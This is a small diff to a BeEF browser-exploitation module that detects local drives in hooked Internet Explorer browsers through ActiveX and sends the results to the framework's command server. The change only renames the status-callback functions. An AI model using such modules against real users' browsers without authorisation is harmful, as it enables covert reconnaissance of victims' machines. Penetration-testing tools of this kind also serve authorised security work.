@@ -8,7 +8,7 @@ beef.execute(function() {
 
   if (!("ActiveXObject" in window)) {
     beef.debug('[Detect Users] Unspported browser');
-    beef.net.send('<%= @command_url %>', <%= @command_id %>,'fail=unsupported browser', beef.are.status_error());
+    beef.net.send('<%= @command_url %>', <%= @command_id %>,'fail=unsupported browser', beef.status.error());
     return false;
   }
 
@@ -32,7 +32,7 @@ beef.execute(function() {
     var result = detect_drive(drive);
     if (result) {
       beef.debug('[Detect Local Drives] Found drive: ' + drive);
-      beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found drive: ' + drive, beef.are.status_success());
+      beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found drive: ' + drive, beef.status.success());
     }
   }
 
